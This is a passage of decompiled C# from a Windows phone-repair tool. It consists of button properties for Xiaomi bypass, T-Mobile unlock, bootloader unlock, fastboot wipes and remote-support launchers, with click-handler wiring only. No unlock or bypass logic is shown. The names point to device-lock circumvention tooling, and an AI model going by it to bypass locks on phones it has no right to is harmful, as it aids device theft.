					btnSolicitarLicenciaporWhats.Click -= value2;
				}
				this._btnSolicitarLicenciaporWhats = value;
				btnSolicitarLicenciaporWhats = this._btnSolicitarLicenciaporWhats;
				if (btnSolicitarLicenciaporWhats != null)
				{
					btnSolicitarLicenciaporWhats.Click += value2;
				}
			}
		}

		// Token: 0x1700007F RID: 127
		// (get) Token: 0x06000237 RID: 567 RVA: 0x00016F4F File Offset: 0x0001514F
		// (set) Token: 0x06000238 RID: 568 RVA: 0x00016F59 File Offset: 0x00015159
		internal virtual FlowLayoutPanel FlowLayoutPanel5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000080 RID: 128
		// (get) Token: 0x06000239 RID: 569 RVA: 0x00016F62 File Offset: 0x00015162
		// (set) Token: 0x0600023A RID: 570 RVA: 0x00016F6C File Offset: 0x0001516C
		internal virtual FlowLayoutPanel FlowLayoutPanel4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000081 RID: 129
		// (get) Token: 0x0600023B RID: 571 RVA: 0x00016F75 File Offset: 0x00015175
		// (set) Token: 0x0600023C RID: 572 RVA: 0x00016F7F File Offset: 0x0001517F
		internal virtual FlowLayoutPanel FlowLayoutPanel6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000082 RID: 130
		// (get) Token: 0x0600023D RID: 573 RVA: 0x00016F88 File Offset: 0x00015188
		// (set) Token: 0x0600023E RID: 574 RVA: 0x00016F92 File Offset: 0x00015192
		internal virtual FlowLayoutPanel FlowLayoutPanel7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000083 RID: 131
		// (get) Token: 0x0600023F RID: 575 RVA: 0x00016F9B File Offset: 0x0001519B
		// (set) Token: 0x06000240 RID: 576 RVA: 0x00016FA5 File Offset: 0x000151A5
		internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000084 RID: 132
		// (get) Token: 0x06000241 RID: 577 RVA: 0x00016FAE File Offset: 0x000151AE
		// (set) Token: 0x06000242 RID: 578 RVA: 0x00016FB8 File Offset: 0x000151B8
		internal virtual FlowLayoutPanel FlowLayoutPanel8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000085 RID: 133
		// (get) Token: 0x06000243 RID: 579 RVA: 0x00016FC1 File Offset: 0x000151C1
		// (set) Token: 0x06000244 RID: 580 RVA: 0x00016FCB File Offset: 0x000151CB
		internal virtual FlowLayoutPanel FlowLayoutPanel9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000086 RID: 134
		// (get) Token: 0x06000245 RID: 581 RVA: 0x00016FD4 File Offset: 0x000151D4
		// (set) Token: 0x06000246 RID: 582 RVA: 0x00016FDE File Offset: 0x000151DE
		internal virtual FlowLayoutPanel FlowLayoutPanel10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x06000247 RID: 583 RVA: 0x00016FE7 File Offset: 0x000151E7
		// (set) Token: 0x06000248 RID: 584 RVA: 0x00016FF1 File Offset: 0x000151F1
		internal virtual FlowLayoutPanel FlowLayoutPanel11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000088 RID: 136
		// (get) Token: 0x06000249 RID: 585 RVA: 0x00016FFA File Offset: 0x000151FA
		// (set) Token: 0x0600024A RID: 586 RVA: 0x00017004 File Offset: 0x00015204
		internal virtual Button ActivarAdbMotorola { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000089 RID: 137
		// (get) Token: 0x0600024B RID: 587 RVA: 0x0001700D File Offset: 0x0001520D
		// (set) Token: 0x0600024C RID: 588 RVA: 0x00017018 File Offset: 0x00015218
		internal virtual Button btnCancelarProceso
		{
			[CompilerGenerated]
			get
			{
				return this._btnCancelarProceso;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnCancelarProceso_Click);
				Button btnCancelarProceso = this._btnCancelarProceso;
				if (btnCancelarProceso != null)
				{
					btnCancelarProceso.Click -= value2;
				}
				this._btnCancelarProceso = value;
				btnCancelarProceso = this._btnCancelarProceso;
				if (btnCancelarProceso != null)
				{
					btnCancelarProceso.Click += value2;
				}
			}
		}

		// Token: 0x1700008A RID: 138
		// (get) Token: 0x0600024D RID: 589 RVA: 0x0001705B File Offset: 0x0001525B
		// (set) Token: 0x0600024E RID: 590 RVA: 0x00017068 File Offset: 0x00015268
		internal virtual Button btnFlashSamsung
		{
			[CompilerGenerated]
			get
			{
				return this._btnFlashSamsung;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnFlashSamsung_Click);
				Button btnFlashSamsung = this._btnFlashSamsung;
				if (btnFlashSamsung != null)
				{
					btnFlashSamsung.Click -= value2;
				}
				this._btnFlashSamsung = value;
				btnFlashSamsung = this._btnFlashSamsung;
				if (btnFlashSamsung != null)
				{
					btnFlashSamsung.Click += value2;
				}
			}
		}

		// Token: 0x1700008B RID: 139
		// (get) Token: 0x0600024F RID: 591 RVA: 0x000170AB File Offset: 0x000152AB
		// (set) Token: 0x06000250 RID: 592 RVA: 0x000170B8 File Offset: 0x000152B8
		internal virtual Button btnDisableUpdatePixel
		{
			[CompilerGenerated]
			get
			{
				return this._btnDisableUpdatePixel;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnDisableUpdatePixel_Click);
				Button btnDisableUpdatePixel = this._btnDisableUpdatePixel;
				if (btnDisableUpdatePixel != null)
				{
					btnDisableUpdatePixel.Click -= value2;
				}
				this._btnDisableUpdatePixel = value;
				btnDisableUpdatePixel = this._btnDisableUpdatePixel;
				if (btnDisableUpdatePixel != null)
				{
					btnDisableUpdatePixel.Click += value2;
				}
			}
		}

		// Token: 0x1700008C RID: 140
		// (get) Token: 0x06000251 RID: 593 RVA: 0x000170FB File Offset: 0x000152FB
		// (set) Token: 0x06000252 RID: 594 RVA: 0x00017108 File Offset: 0x00015308
		internal virtual Button btnUnlockTMobile
		{
			[CompilerGenerated]
			get
			{
				return this._btnUnlockTMobile;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnUnlockTMobile_Click);
				Button btnUnlockTMobile = this._btnUnlockTMobile;
				if (btnUnlockTMobile != null)
				{
					btnUnlockTMobile.Click -= value2;
				}
				this._btnUnlockTMobile = value;
				btnUnlockTMobile = this._btnUnlockTMobile;
				if (btnUnlockTMobile != null)
				{
					btnUnlockTMobile.Click += value2;
				}
			}
		}

		// Token: 0x1700008D RID: 141
		// (get) Token: 0x06000253 RID: 595 RVA: 0x0001714B File Offset: 0x0001534B
		// (set) Token: 0x06000254 RID: 596 RVA: 0x00017158 File Offset: 0x00015358
		internal virtual Button btnWipeFastbootHonor
		{
			[CompilerGenerated]
			get
			{
				return this._btnWipeFastbootHonor;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnWipeFastbootHonor_Click);
				Button btnWipeFastbootHonor = this._btnWipeFastbootHonor;
				if (btnWipeFastbootHonor != null)
				{
					btnWipeFastbootHonor.Click -= value2;
				}
				this._btnWipeFastbootHonor = value;
				btnWipeFastbootHonor = this._btnWipeFastbootHonor;
				if (btnWipeFastbootHonor != null)
				{
					btnWipeFastbootHonor.Click += value2;
				}
			}
		}

		// Token: 0x1700008E RID: 142
		// (get) Token: 0x06000255 RID: 597 RVA: 0x0001719B File Offset: 0x0001539B
		// (set) Token: 0x06000256 RID: 598 RVA: 0x000171A8 File Offset: 0x000153A8
		internal virtual Button btnOpenFileHxd
		{
			[CompilerGenerated]
			get
			{
				return this._btnOpenFileHxd;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnOpenFileHxd_Click);
				Button btnOpenFileHxd = this._btnOpenFileHxd;
				if (btnOpenFileHxd != null)
				{
					btnOpenFileHxd.Click -= value2;
				}
				this._btnOpenFileHxd = value;
				btnOpenFileHxd = this._btnOpenFileHxd;
				if (btnOpenFileHxd != null)
				{
					btnOpenFileHxd.Click += value2;
				}
			}
		}

		// Token: 0x1700008F RID: 143
		// (get) Token: 0x06000257 RID: 599 RVA: 0x000171EB File Offset: 0x000153EB
		// (set) Token: 0x06000258 RID: 600 RVA: 0x000171F8 File Offset: 0x000153F8
		internal virtual Button btnXiaomiBypassv1
		{
			[CompilerGenerated]
			get
			{
				return this._btnXiaomiBypassv1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnXiaomiBypassv1_Click);
				Button btnXiaomiBypassv = this._btnXiaomiBypassv1;
				if (btnXiaomiBypassv != null)
				{
					btnXiaomiBypassv.Click -= value2;
				}
				this._btnXiaomiBypassv1 = value;
				btnXiaomiBypassv = this._btnXiaomiBypassv1;
				if (btnXiaomiBypassv != null)
				{
					btnXiaomiBypassv.Click += value2;
				}
			}
		}

		// Token: 0x17000090 RID: 144
		// (get) Token: 0x06000259 RID: 601 RVA: 0x0001723B File Offset: 0x0001543B
		// (set) Token: 0x0600025A RID: 602 RVA: 0x00017248 File Offset: 0x00015448
		internal virtual Button btnXiaomiBypassv2
		{
			[CompilerGenerated]
			get
			{
				return this._btnXiaomiBypassv2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnXiaomiBypassv2_Click);
				Button btnXiaomiBypassv = this._btnXiaomiBypassv2;
				if (btnXiaomiBypassv != null)
				{
					btnXiaomiBypassv.Click -= value2;
				}
				this._btnXiaomiBypassv2 = value;
				btnXiaomiBypassv = this._btnXiaomiBypassv2;
				if (btnXiaomiBypassv != null)
				{
					btnXiaomiBypassv.Click += value2;
				}
			}
		}

		// Token: 0x17000091 RID: 145
		// (get) Token: 0x0600025B RID: 603 RVA: 0x0001728B File Offset: 0x0001548B
		// (set) Token: 0x0600025C RID: 604 RVA: 0x00017298 File Offset: 0x00015498
		internal virtual Button btnProcesoHonorItv1
		{
			[CompilerGenerated]
			get
			{
				return this._btnProcesoHonorItv1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnProcesoHonorItv1_Click);
				Button btnProcesoHonorItv = this._btnProcesoHonorItv1;
				if (btnProcesoHonorItv != null)
				{
					btnProcesoHonorItv.Click -= value2;
				}
				this._btnProcesoHonorItv1 = value;
				btnProcesoHonorItv = this._btnProcesoHonorItv1;
				if (btnProcesoHonorItv != null)
				{
					btnProcesoHonorItv.Click += value2;
				}
			}
		}

		// Token: 0x17000092 RID: 146
		// (get) Token: 0x0600025D RID: 605 RVA: 0x000172DB File Offset: 0x000154DB
		// (set) Token: 0x0600025E RID: 606 RVA: 0x000172E5 File Offset: 0x000154E5
		internal virtual TabPage Remoto { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000093 RID: 147
		// (get) Token: 0x0600025F RID: 607 RVA: 0x000172EE File Offset: 0x000154EE
		// (set) Token: 0x06000260 RID: 608 RVA: 0x000172F8 File Offset: 0x000154F8
		internal virtual FlowLayoutPanel FlowLayoutPanel12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000094 RID: 148
		// (get) Token: 0x06000261 RID: 609 RVA: 0x00017301 File Offset: 0x00015501
		// (set) Token: 0x06000262 RID: 610 RVA: 0x0001730C File Offset: 0x0001550C
		internal virtual Button btnUsbRedirectorV2
		{
			[CompilerGenerated]
			get
			{
				return this._btnUsbRedirectorV2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnUsbRedirectorV2_Click);
				Button btnUsbRedirectorV = this._btnUsbRedirectorV2;
				if (btnUsbRedirectorV != null)
				{
					btnUsbRedirectorV.Click -= value2;
				}
				this._btnUsbRedirectorV2 = value;
				btnUsbRedirectorV = this._btnUsbRedirectorV2;
				if (btnUsbRedirectorV != null)
				{
					btnUsbRedirectorV.Click += value2;
				}
			}
		}

		// Token: 0x17000095 RID: 149
		// (get) Token: 0x06000263 RID: 611 RVA: 0x0001734F File Offset: 0x0001554F
		// (set) Token: 0x06000264 RID: 612 RVA: 0x0001735C File Offset: 0x0001555C
		internal virtual Button btnanydesk
		{
			[CompilerGenerated]
			get
			{
				return this._btnanydesk;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnanydesk_Click);
				Button btnanydesk = this._btnanydesk;
				if (btnanydesk != null)
				{
					btnanydesk.Click -= value2;
				}
				this._btnanydesk = value;
				btnanydesk = this._btnanydesk;
				if (btnanydesk != null)
				{
					btnanydesk.Click += value2;
				}
			}
		}

		// Token: 0x17000096 RID: 150
		// (get) Token: 0x06000265 RID: 613 RVA: 0x0001739F File Offset: 0x0001559F
		// (set) Token: 0x06000266 RID: 614 RVA: 0x000173AC File Offset: 0x000155AC
		internal virtual Button btnwipefastbootmt
		{
			[CompilerGenerated]
			get
			{
				return this._btnwipefastbootmt;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnwipefastbootmt_Click);
				Button btnwipefastbootmt = this._btnwipefastbootmt;
				if (btnwipefastbootmt != null)
				{
					btnwipefastbootmt.Click -= value2;
				}
				this._btnwipefastbootmt = value;
				btnwipefastbootmt = this._btnwipefastbootmt;
				if (btnwipefastbootmt != null)
				{
					btnwipefastbootmt.Click += value2;
				}
			}
		}

		// Token: 0x17000097 RID: 151
		// (get) Token: 0x06000267 RID: 615 RVA: 0x000173EF File Offset: 0x000155EF
		// (set) Token: 0x06000268 RID: 616 RVA: 0x000173F9 File Offset: 0x000155F9
		internal virtual Label lblStatus { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000098 RID: 152
		// (get) Token: 0x06000269 RID: 617 RVA: 0x00017402 File Offset: 0x00015602
		// (set) Token: 0x0600026A RID: 618 RVA: 0x0001740C File Offset: 0x0001560C
		internal virtual Button btnHonorfullv1
		{
			[CompilerGenerated]
			get
			{
				return this._btnHonorfullv1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnHonorfullv1_Click);
				Button btnHonorfullv = this._btnHonorfullv1;
				if (btnHonorfullv != null)
				{
					btnHonorfullv.Click -= value2;
				}
				this._btnHonorfullv1 = value;
				btnHonorfullv = this._btnHonorfullv1;
				if (btnHonorfullv != null)
				{
					btnHonorfullv.Click += value2;
				}
			}
		}

		// Token: 0x17000099 RID: 153
		// (get) Token: 0x0600026B RID: 619 RVA: 0x0001744F File Offset: 0x0001564F
		// (set) Token: 0x0600026C RID: 620 RVA: 0x0001745C File Offset: 0x0001565C
		internal virtual Button btnservices
		{
			[CompilerGenerated]
			get
			{
				return this._btnservices;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnservices_Click);
				Button btnservices = this._btnservices;
				if (btnservices != null)
				{
					btnservices.Click -= value2;
				}
				this._btnservices = value;
				btnservices = this._btnservices;
				if (btnservices != null)
				{
					btnservices.Click += value2;
				}
			}
		}

		// Token: 0x1700009A RID: 154
		// (get) Token: 0x0600026D RID: 621 RVA: 0x0001749F File Offset: 0x0001569F
		// (set) Token: 0x0600026E RID: 622 RVA: 0x000174AC File Offset: 0x000156AC
		internal virtual Button btnUnlockBootloader
		{
			[CompilerGenerated]
			get
			{
				return this._btnUnlockBootloader;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnUnlockBootloader_Click);
				Button btnUnlockBootloader = this._btnUnlockBootloader;
				if (btnUnlockBootloader != null)
				{
					btnUnlockBootloader.Click -= value2;
				}
				this._btnUnlockBootloader = value;
				btnUnlockBootloader = this._btnUnlockBootloader;
				if (btnUnlockBootloader != null)
				{
					btnUnlockBootloader.Click += value2;
				}
			}
		}

		// Token: 0x1700009B RID: 155
		// (get) Token: 0x0600026F RID: 623 RVA: 0x000174EF File Offset: 0x000156EF
		// (set) Token: 0x06000270 RID: 624 RVA: 0x000174FC File Offset: 0x000156FC
		internal virtual Button btnOpenSettings
		{
			[CompilerGenerated]
			get
			{
				return this._btnOpenSettings;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.btnOpenSettings_Click);
				Button btnOpenSettings = this._btnOpenSettings;
				if (btnOpenSettings != null)
				{
					btnOpenSettings.Click -= value2;
				}
				this._btnOpenSettings = value;
				btnOpenSettings = this._btnOpenSettings;
				if (btnOpenSettings != null)
				{
					btnOpenSettings.Click += value2;
				}
			}
		}

		// Token: 0x0400000F RID: 15
		private JObject permisosUsuario;

		// Token: 0x04000010 RID: 16
		private const string CurrentVersion = "0.1.15";

		// Token: 0x04000011 RID: 17
		private const string VersionUrl = "https://reparacionesdecelular.com/up/versionts.txt";

		// Token: 0x04000012 RID: 18
		private System.Timers.Timer fastbootTimer;

		// Token: 0x04000013 RID: 19
		private bool downloading;

		// Token: 0x04000014 RID: 20
		private string xmlFilePath;

		// Token: 0x04000015 RID: 21
		private WebClient webClient;

		// Token: 0x04000016 RID: 22
		private bool processRunning;

		// Token: 0x04000017 RID: 23
		private bool cancelRequested;

		// Token: 0x04000018 RID: 24
		private string downloadedFilePath;

		// Token: 0x04000019 RID: 25
		private bool isUnzipping;

		// Token: 0x0400001C RID: 28
		private Dictionary<string, List<string>> brandsAndModels;

		// Token: 0x0400001D RID: 29
		private string placeholderText;

		// Token: 0x0400001E RID: 30
		private CancellationTokenSource cts;

		// Token: 0x0400001F RID: 31
		private bool verificandoBloqueos;

		// Token: 0x04000020 RID: 32
		private string currentFilePath;

		// Token: 0x04000021 RID: 33
		private object processLock;

		// Token: 0x04000022 RID: 34
		private readonly byte[] misc_qualcomm;

		// Token: 0x04000023 RID: 35
		private readonly byte[] para_mtk;

		// Token: 0x04000024 RID: 36
		private readonly byte[] misc_mtk;

		// Token: 0x0200001E RID: 30
		public class VirusAnalysisResult
		{
			// Token: 0x170000F8 RID: 248
			// (get) Token: 0x0600042B RID: 1067 RVA: 0x000204FA File Offset: 0x0001E6FA
			// (set) Token: 0x0600042C RID: 1068 RVA: 0x00020504 File Offset: 0x0001E704
			public bool IsThreat { get; set; }

			// Token: 0x170000F9 RID: 249
			// (get) Token: 0x0600042D RID: 1069 RVA: 0x0002050D File Offset: 0x0001E70D
			// (set) Token: 0x0600042E RID: 1070 RVA: 0x00020517 File Offset: 0x0001E717
			public string SHA256 { get; set; }

			// Token: 0x170000FA RID: 250
			// (get) Token: 0x0600042F RID: 1071 RVA: 0x00020520 File Offset: 0x0001E720
			// (set) Token: 0x06000430 RID: 1072 RVA: 0x0002052A File Offset: 0x0001E72A
			public int Malicious { get; set; }

			// Token: 0x170000FB RID: 251
			// (get) Token: 0x06000431 RID: 1073 RVA: 0x00020533 File Offset: 0x0001E733
			// (set) Token: 0x06000432 RID: 1074 RVA: 0x0002053D File Offset: 0x0001E73D
			public int Suspicious { get; set; }

			// Token: 0x170000FC RID: 252
			// (get) Token: 0x06000433 RID: 1075 RVA: 0x00020546 File Offset: 0x0001E746
			// (set) Token: 0x06000434 RID: 1076 RVA: 0x00020550 File Offset: 0x0001E750
			public int Undetected { get; set; }
		}
	}
}
